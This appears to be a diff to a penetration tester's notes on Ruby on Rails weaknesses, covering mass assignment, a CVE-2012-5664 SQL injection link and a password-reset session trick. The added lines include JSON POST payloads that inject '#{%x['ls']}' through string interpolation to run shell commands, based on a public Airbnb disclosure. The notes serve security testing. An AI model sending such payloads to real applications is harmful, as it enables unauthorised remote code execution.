@@ -17,10 +17,17 @@ will also tell if it's rails or another ruby framework such as Sinatra
 # see talk by joernchen of Phenoelit at hitb 2012 
 
 # mass assignment
-si c'est pas du rails 4, faut tenter dans chaque champ
+http://guides.rubyonrails.org/v3.2.9/security.html#mass-assignment
+try every field if it's not rails 4 (https://code.tutsplus.com/tutorials/mass-assignment-rails-and-you--net-31695)
 
 # SQLi in RoR CVE-2012-5664
 https://groups.google.com/forum/#!topic/rubyonrails-security/DCNTNp_qjFM
+
+# use #{} to evaluate code. Using the %x arg we were able to execute shell commands.
+http://buer.haus/2017/03/13/airbnb-ruby-on-rails-string-interpolation-led-to-remote-code-execution/
+POST {“listing”:{“directions”:[{“test”:”test1″}]}} instead of {“listing”:{“directions”:”test”}} => "directions":"---\n- !ruby/hash:ActionDispatch::Http::ParamsHashWithIndifferentAccess\n  test: test1\n"
+POST {"listing":{"directions":[{"test":[{"abc":"#{1+1}"}]}] }} => abc: ! ‘2’
+POST {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }} => rce
 
 # reset pw
 session[params[:token]] # there will always be session_id and _csrf_token in the session dictionary
